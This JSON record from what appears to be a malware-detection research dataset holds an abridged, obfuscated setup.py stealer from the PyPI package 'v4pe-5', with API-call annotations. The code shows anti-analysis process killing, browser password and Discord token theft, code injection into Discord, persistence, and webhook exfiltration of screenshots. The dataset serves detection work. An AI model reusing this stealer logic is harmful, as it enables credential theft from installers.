{
  "metadata": {
    "package_name": "v4pe-5",
    "original_json_path": "/home2/blue/Documents/PyPIAgent/Codes/tool_detect/false_negative/llm_analysis/v4pe-5.json",
    "dataset_type": "malware_fn"
  },
  "code_files": [
    {
      "pyfile": "setup.py",
      "full_path": "/home2/blue/Documents/PyPIAgent/Dataset/study/unzip_malware/v4pe-5/v4pe-5/setup.py",
      "code_snippets": [
        {
          "snippet": "import subprocess\nimport ctypes\nimport os\nimport shutil\nimport re\nimport psutil\nimport requests\nimport base64\nimport json\nfrom Crypto.Cipher import AES\nfrom discord import Embed, SyncWebhook, File\nfrom win32crypt import CryptUnprotectData\nimport uuid\nimport wmi\nfrom PIL import ImageGrab\nimport sqlite3\nfrom pathlib import Path\nfrom zipfile import ZipFile\n\n# --- Malicious Data Exfiltration, Credential/Token Stealing, Persistence, and Injection ---\n\n# 1. Anti-debugging, anti-analysis, and process killing\nclass AntiDebug:\n    def __init__(self):\n        if self.checks():\n            sys.exit(int())\n    def checks(self):\n        # ... (blacklists, process killing, network/system checks)\n        self.check_process()\n        if self.get_network():\n            debugging = True\n        if self.get_system():\n            debugging = True\n        return debugging\n    def check_process(self):\n        for proc in psutil.process_iter():\n            if any((procstr in proc.name().lower() for procstr in self.blacklistedProcesses)):\n                try:\n                    proc.kill()\n                except (psutil.NoSuchProcess, psutil.AccessDenied):\n                    pass\n    def get_network(self):\n        ip = requests.get(base64.b64decode(zlib.decompress(b'x...')).decode()).text\n        mac = base64.b64decode(zlib.decompress(b'x...')).decode().join(re.findall(base64.b64decode(zlib.decompress(b'x...')).decode(), base64.b64decode(zlib.decompress(b'x...')).decode() % uuid.getnode()))\n        if ip in self.blackListedIPS:\n            return True\n        if mac in self.blackListedMacs:\n            return True\n    def get_system(self):\n        try:\n            hwid = subprocess.check_output(base64.b64decode(zlib.decompress(b'x...')).decode(), shell=True, stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode(base64.b64decode(zlib.decompress(b'x...')).decode()).split(base64.b64decode(zlib.decompress(b'x...')).decode())[int.from_bytes(map(lambda O, i: 997 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)].strip()\n        except:\n            hwid = base64.b64decode(zlib.decompress(b'x...')).decode()\n        username = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())\n        hostname = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())\n        for i in zip(self.blackListedHWIDS, self.blackListedUsers, self.blackListedPCNames):\n            if hwid in i or username in i or hostname in i:\n                return True\n\n# 2. Chromium/Opera browser credential, cookie, history, download, and credit card theft\nclass Chromium:\n    def __init__(self):\n        # ... (find browser paths, enumerate profiles)\n        for _, path in self.browsers.items():\n            if not os.path.exists(path):\n                continue\n            self.master_key = self.get_master_key(base64.b64decode(zlib.decompress(b'x...')).decode().format(path))\n            if not self.master_key:\n                continue\n            for profile in self.profiles:\n                if not os.path.exists(path + base64.b64decode(zlib.decompress(b'x...')).decode() + profile):\n                    continue\n                operations = [self.get_login_data, self.get_cookies, self.get_web_history, self.get_downloads, self.get_credit_cards]\n                for operation in operations:\n                    try:\n                        operation(path, profile)\n                    except Exception:\n                        pass\n    def get_master_key(self, path):\n        if not os.path.exists(path):\n            return\n        if base64.b64decode(zlib.decompress(b'x...')).decode() not in open(path, base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode()).read():\n            return\n        with open(path, base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode()) as f:\n            c = f.read()\n        local_state = json.loads(c)\n        master_key = base64.b64decode(local_state[base64.b64decode(zlib.decompress(b'x...')).decode()][base64.b64decode(zlib.decompress(b'x...')).decode()])\n        master_key = master_key[int.from_bytes(map(lambda O, i: 471 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):]\n        master_key = CryptUnprotectData(master_key, None, None, None, int.from_bytes(map(lambda O, i: 371 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(0)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False))[int.from_bytes(map(lambda O, i: 852 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)]\n        return master_key\n    def decrypt_password(self, buff, master_key):\n        iv = buff[int.from_bytes(map(lambda O, i: 531 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):int.from_bytes(map(lambda O, i: 409 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)]\n        payload = buff[int.from_bytes(map(lambda O, i: 993 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):]\n        cipher = AES.new(master_key, AES.MODE_GCM, iv)\n        decrypted_pass = cipher.decrypt(payload)\n        decrypted_pass = decrypted_pass[:-int.from_bytes(map(lambda O, i: 701 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)].decode()\n        return decrypted_pass\n    def get_login_data(self, path, profile):\n        # ... (copy, open, and extract credentials from browser database, decrypt, and append to global list)\n        pass\n    def get_cookies(self, path, profile):\n        # ... (copy, open, and extract cookies from browser database, decrypt, and append to global list)\n        pass\n    def get_web_history(self, path, profile):\n        # ... (copy, open, and extract web history from browser database, append to global list)\n        pass\n    def get_downloads(self, path, profile):\n        # ... (copy, open, and extract downloads from browser database, append to global list)\n        pass\n    def get_credit_cards(self, path, profile):\n        # ... (copy, open, and extract credit cards from browser database, decrypt, and append to global list)\n        pass\n\n# 3. Discord token extraction and exfiltration\nclass extract_tokens:\n    def __init__(self):\n        # ... (set up paths, regex, extract tokens)\n        self.extract()\n    def extract(self):\n        # ... (search for Discord tokens in various app data folders, decrypt, validate, and collect tokens)\n        pass\n    def validate_token(self, token):\n        r = requests.get(self.base_url, headers={base64.b64decode(zlib.decompress(b'x...')).decode(): token})\n        if r.status_code == int.from_bytes(map(lambda O, i: 858 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):\n            return True\n        return False\n    def decrypt_val(self, buff, master_key):\n        # ... (decrypt Discord token using master key)\n        pass\n    def get_master_key(self, path):\n        # ... (extract and decrypt master key from Local State)\n        pass\n\nclass upload_tokens:\n    def __init__(self, webhook):\n        self.tokens = extract_tokens().tokens\n        self.webhook = SyncWebhook.from_url(webhook)\n    def upload(self):\n        if not self.tokens:\n            return\n        for token in self.tokens:\n            user = requests.get(base64.b64decode(zlib.decompress(b'x...')).decode(), headers={base64.b64decode(zlib.decompress(b'x...')).decode(): token}).json()\n            # ... (collect user info, badges, payment, guilds, friends, gift codes, etc.)\n            embed = Embed(title=base64.b64decode(zlib.decompress(b'x...')).decode().format(username, user_id), color=int.from_bytes(map(lambda O, i: 719 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(0)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False))\n            # ... (add fields, send to webhook)\n            self.webhook.send(embed=embed, username=base64.b64decode(zlib.decompress(b'x...')).decode(), avatar_url=base64.b64decode(zlib.decompress(b'x...')).decode())\n\n# 4. Injection into Discord installations (malicious code injection for persistence and further compromise)\nclass Injection:\n    def __init__(self, webhook):\n        self.appdata = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode())\n        self.discord_dirs = [self.appdata + base64.b64decode(zlib.decompress(b'x...')).decode(), ...]\n        self.code = requests.get(base64.b64decode(zlib.decompress(b'x...')).decode()).text\n        for proc in psutil.process_iter():\n            if base64.b64decode(zlib.decompress(b'x...')).decode() in proc.name().lower():\n                proc.kill()\n        for dir in self.discord_dirs:\n            if not os.path.exists(dir):\n                continue\n            if self.get_core(dir) is not None:\n                with open(self.get_core(dir)[int.from_bytes(map(lambda O, i: 286 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(0)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)] + base64.b64decode(zlib.decompress(b'x...')).decode(), base64.b64decode(zlib.decompress(b'x...')).decode(), encoding=base64.b64decode(zlib.decompress(b'x...')).decode()) as f:\n                    f.write(self.code.replace(base64.b64decode(zlib.decompress(b'x...')).decode(), self.get_core(dir)[int.from_bytes(map(lambda O, i: 313 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False)]).replace(base64.b64decode(zlib.decompress(b'x...')).decode(), webhook))\n                    self.start_discord(dir)\n    def get_core(self, dir):\n        # ... (locate Discord core files for injection)\n        pass\n    def start_discord(self, dir):\n        # ... (restart Discord to load injected code)\n        pass\n\n# 5. Persistence via startup folder and registry modification\nclass Startup:\n    def __init__(self):\n        self.working_dir = os.getenv(base64.b64decode(zlib.decompress(b'x...')).decode()) + base64.b64decode(zlib.decompress(b'x...')).decode()\n        if self.check_self():\n            return\n        self.mkdir()\n        self.write_stub()\n        self.regedit()\n    def check_self(self):\n        if os.path.realpath(sys.executable) == self.working_dir + base64.b64decode(zlib.decompress(b'x...')).decode():\n            return True\n        return False\n    def mkdir(self):\n        if not os.path.isdir(self.working_dir):\n            os.mkdir(self.working_dir)\n        else:\n            shutil.rmtree(self.working_dir)\n            os.mkdir(self.working_dir)\n    def write_stub(self):\n        shutil.copy2(os.path.realpath(sys.executable), self.working_dir + base64.b64decode(zlib.decompress(b'x...')).decode())\n        with open(file=base64.b64decode(zlib.decompress(b'x...')).decode().format(self.working_dir), mode=base64.b64decode(zlib.decompress(b'x...')).decode()) as f:\n            f.write(base64.b64decode(zlib.decompress(b'x...')).decode().format(self.working_dir))\n    def regedit(self):\n        subprocess.run(args=[base64.b64decode(zlib.decompress(b'x...')).decode(), ...], shell=True)\n        subprocess.run(args=[base64.b64decode(zlib.decompress(b'x...')).decode(), ...], shell=True)\n\n# 6. System information and screenshot exfiltration\nclass SystemInfo:\n    def __init__(self, webhook):\n        webhook = SyncWebhook.from_url(webhook)\n        embed = Embed(title=base64.b64decode(zlib.decompress(b'x...')).decode(), color=int.from_bytes(map(lambda O, i: 664 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(0)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False))\n        # ... (add fields for user, system, disk, network, wifi, etc.)\n        image = ImageGrab.grab(bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None)\n        image.save(base64.b64decode(zlib.decompress(b'x...')).decode())\n        embed.set_image(url=base64.b64decode(zlib.decompress(b'x...')).decode())\n        try:\n            webhook.send(embed=embed, file=File(base64.b64decode(zlib.decompress(b'x...')).decode(), filename=base64.b64decode(zlib.decompress(b'x...')).decode()), username=base64.b64decode(zlib.decompress(b'x...')).decode(), avatar_url=base64.b64decode(zlib.decompress(b'x...')).decode())\n        except:\n            pass\n        if os.path.exists(base64.b64decode(zlib.decompress(b'x...')).decode()):\n            os.remove(base64.b64decode(zlib.decompress(b'x...')).decode())\n\n# 7. Main execution logic to run all malicious modules\n\ndef main():\n    funcs = [AntiDebug, Browsers, DiscordToken, Injection, Startup, SystemInfo]\n    for func in funcs:\n        if __CONFIG__[func.__name__.lower()]:\n            try:\n                if func.__init__.__code__.co_argcount == int.from_bytes(map(lambda O, i: 453 - (int(O) + i), map(base64.b64decode(zlib.decompress(b'x...')).decode().join, zip(*[iter(base64.b64decode(zlib.decompress(b'x...')).decode())] * 3)), range(1)), base64.b64decode(zlib.decompress(b'x...')).decode(), signed=False):\n                    func(__CONFIG__[base64.b64decode(zlib.decompress(b'x...')).decode()])\n                else:\n                    func()\n            except Exception as e:\n                print(base64.b64decode(zlib.decompress(b'x...')).decode().format(func.__name__, e))\n\nif __name__ == base64.b64decode(zlib.decompress(b'x...')).decode():\n    main()\n",
          "triple_sequences": [
            {
              "action_api": "psutil.process_iter()",
              "action_description": "Iterates over all running processes",
              "action_id": "iterate_processes",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "List processes",
              "intention_id": "list_processes"
            },
            {
              "action_api": "proc.name()",
              "action_description": "Retrieves process name",
              "action_id": "get_process_name",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect process name",
              "intention_id": "collect_process_name"
            },
            {
              "action_api": "proc.kill()",
              "action_description": "Terminates the process",
              "action_id": "terminate_process",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate process",
              "intention_id": "terminate_process"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "base64.b64decode(zlib.decompress(b'x...')).decode()",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Download remote content",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "zlib.decompress(b'x...')",
              "object_description": "Obfuscated string and compressed data",
              "object_id": "obfuscated_compressed_data",
              "intention_description": "Decode obfuscated data",
              "intention_id": "decode_obfuscated_data"
            },
            {
              "action_api": "zlib.decompress()",
              "action_description": "Decompresses zlib-compressed data",
              "action_id": "decompress_data_zlib",
              "object": "b'x...'",
              "object_description": "Obfuscated string and compressed data",
              "object_id": "obfuscated_compressed_data",
              "intention_description": "Decompress obfuscated payload",
              "intention_id": "decompress_obfuscated_payload"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "base64.b64decode(zlib.decompress(b'x...')).decode()",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "subprocess.check_output()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "base64.b64decode(zlib.decompress(b'x...')).decode()",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Collect system info",
              "intention_id": "get_system_info"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Check if file or directory exists",
              "intention_id": "check_file_existence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for reading (normal reading, binary reading)",
              "action_id": "basic_read_operations",
              "object": "path, mode, encoding",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Read file content",
              "intention_id": "read_file_content"
            },
            {
              "action_api": "json.loads()",
              "action_description": "Deserializes JSON string to Python object",
              "action_id": "deserialize_from_json",
              "object": "c",
              "object_description": "JSON string",
              "object_id": "json_string",
              "intention_description": "Parse JSON data",
              "intention_id": "parse_json_data"
            },
            {
              "action_api": "base64.b64decode()",
              "action_description": "Decodes base64-encoded string to bytes",
              "action_id": "decode_base64_to_bytes",
              "object": "local_state[...]",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Decode base64 data",
              "intention_id": "decode_base64_data"
            },
            {
              "action_api": "CryptUnprotectData()",
              "action_description": "Decrypts Windows DPAPI-encrypted data",
              "action_id": "decrypt_dpapi_data",
              "object": "master_key",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser master key",
              "intention_id": "decrypt_browser_master_key"
            },
            {
              "action_api": "AES.new()",
              "action_description": "Initializes symmetric encryption with provided key",
              "action_id": "init_symmetric_encryption",
              "object": "master_key, AES.MODE_GCM, iv",
              "object_description": "Decryption key and initialization vector",
              "object_id": "decryption_key_iv",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "cipher.decrypt()",
              "action_description": "Decrypts data using initialized AES cipher",
              "action_id": "decrypt_aes_data",
              "object": "payload",
              "object_description": "Encrypted data",
              "object_id": "encrypted_data",
              "intention_description": "Decrypt browser password",
              "intention_id": "decrypt_browser_password"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "path + ... + profile",
              "object_description": "Directory path and file name",
              "object_id": "directory_path_with_file",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "self.base_url, headers={...: token}",
              "object_description": "API endpoint",
              "object_id": "api_endpoint",
              "intention_description": "Access remote data",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "requests.get()",
              "action_description": "Sends HTTP request",
              "action_id": "send_http_request",
              "object": "base64.b64decode(zlib.decompress(b'x...')).decode(), headers={...: token}",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Access remote data",
              "intention_id": "download_remote_content"
            },
            {
              "action_api": "Embed()",
              "action_description": "Creates Discord embed object",
              "action_id": "create_discord_embed",
              "object": "title, color",
              "object_description": "Serialized embed object",
              "object_id": "serialized_embed_object",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "SyncWebhook.from_url()",
              "action_description": "Creates Discord webhook object",
              "action_id": "create_discord_webhook",
              "object": "webhook",
              "object_description": "Discord webhook URL",
              "object_id": "discord_webhook_url",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "self.webhook.send()",
              "action_description": "Sends message to Discord channel via webhook",
              "action_id": "send_discord_webhook",
              "object": "embed=embed, username=..., avatar_url=...",
              "object_description": "Webhook payload data",
              "object_id": "webhook_data",
              "intention_description": "Send Discord tokens to server",
              "intention_id": "send_discord_tokens_server"
            },
            {
              "action_api": "os.getenv()",
              "action_description": "Retrieves value of environment variable",
              "action_id": "get_env_var",
              "object": "base64.b64decode(zlib.decompress(b'x...')).decode()",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Collect environment variable",
              "intention_id": "collect_environment_variable"
            },
            {
              "action_api": "psutil.process_iter()",
              "action_description": "Iterates over all running processes",
              "action_id": "iterate_processes",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "List processes",
              "intention_id": "list_processes"
            },
            {
              "action_api": "proc.name()",
              "action_description": "Retrieves process name",
              "action_id": "get_process_name",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Collect process name",
              "intention_id": "collect_process_name"
            },
            {
              "action_api": "proc.kill()",
              "action_description": "Terminates the process",
              "action_id": "terminate_process",
              "object": "",
              "object_description": "",
              "object_id": "",
              "intention_description": "Terminate process",
              "intention_id": "terminate_process"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "dir",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "open()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "file=..., mode=..., encoding=...",
              "object_description": "File path",
              "object_id": "file_path",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "f.write()",
              "action_description": "File opening operations for writing (normal writing, binary writing)",
              "action_id": "basic_write_operations",
              "object": "self.code.replace(...)",
              "object_description": "Script file content",
              "object_id": "script_file_content",
              "intention_description": "Write file content",
              "intention_id": "write_file_content"
            },
            {
              "action_api": "os.path.isdir()",
              "action_description": "Checks if specified path exists and is a directory",
              "action_id": "check_directory_exists",
              "object": "self.working_dir",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Determine presence of directory",
              "intention_id": "determine_directory_presence"
            },
            {
              "action_api": "os.mkdir()",
              "action_description": "Creates directory, ignoring if it already exists",
              "action_id": "create_directory",
              "object": "self.working_dir",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Ensure directory exists",
              "intention_id": "ensure_directory_exists"
            },
            {
              "action_api": "shutil.rmtree()",
              "action_description": "Recursively deletes directory and its contents",
              "action_id": "delete_directory",
              "object": "self.working_dir",
              "object_description": "Directory path",
              "object_id": "directory_path",
              "intention_description": "Delete directory content",
              "intention_id": "delete_directory_content"
            },
            {
              "action_api": "shutil.copy2()",
              "action_description": "Copies file to destination",
              "action_id": "copy_file",
              "object": "os.path.realpath(sys.executable), self.working_dir + ...",
              "object_description": "Executable file and startup path",
              "object_id": "executable_startup_path",
              "intention_description": "Copy file to startup directory",
              "intention_id": "copy_file_startup_directory"
            },
            {
              "action_api": "subprocess.run()",
              "action_description": "Executes shell command",
              "action_id": "execute_shell_command",
              "object": "args=[base64.b64decode(zlib.decompress(b'x...')).decode(), ...], shell=True",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Execute command",
              "intention_id": "execute_command"
            },
            {
              "action_api": "ImageGrab.grab()",
              "action_description": "Captures screenshot of screen",
              "action_id": "capture_screen_region",
              "object": "bbox=None, include_layered_windows=False, all_screens=True, xdisplay=None",
              "object_description": "Screen region",
              "object_id": "screen_region",
              "intention_description": "Capture screenshot",
              "intention_id": "capture_screenshot"
            },
            {
              "action_api": "image.save()",
              "action_description": "Saves image to file",
              "action_id": "save_image_file",
              "object": "base64.b64decode(zlib.decompress(b'x...')).decode()",
              "object_description": "Image file",
              "object_id": "image_file",
              "intention_description": "Save screenshot to file",
              "intention_id": "save_screenshot_file"
            },
            {
              "action_api": "embed.set_image()",
              "action_description": "Sets thumbnail image for Discord embed",
              "action_id": "set_discord_thumbnail",
              "object": "url=base64.b64decode(zlib.decompress(b'x...')).decode()",
              "object_description": "Discord CDN URL",
              "object_id": "discord_cdn_url",
              "intention_description": "Prepare webhook for data transmission",
              "intention_id": "webhook_transmission_preparation"
            },
            {
              "action_api": "webhook.send()",
              "action_description": "Sends message to Discord channel via webhook",
              "action_id": "send_discord_webhook",
              "object": "embed=embed, file=File(...), username=..., avatar_url=...",
              "object_description": "Webhook payload data",
              "object_id": "webhook_data",
              "intention_description": "Send system information to server",
              "intention_id": "send_system_info_server"
            },
            {
              "action_api": "os.path.exists()",
              "action_description": "Checks if specified path exists in filesystem",
              "action_id": "check_path_exists",
              "object": "base64.b64decode(zlib.decompress(b'x...')).decode()",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Determine presence of file",
              "intention_id": "determine_file_presence"
            },
            {
              "action_api": "os.remove()",
              "action_description": "Deletes specified file from filesystem",
              "action_id": "delete_file",
              "object": "base64.b64decode(zlib.decompress(b'x...')).decode()",
              "object_description": "Base64-encoded string",
              "object_id": "base64_encoded_string",
              "intention_description": "Delete file",
              "intention_id": "delete_file"
            }
          ]
        }
      ]
    }
  ]
}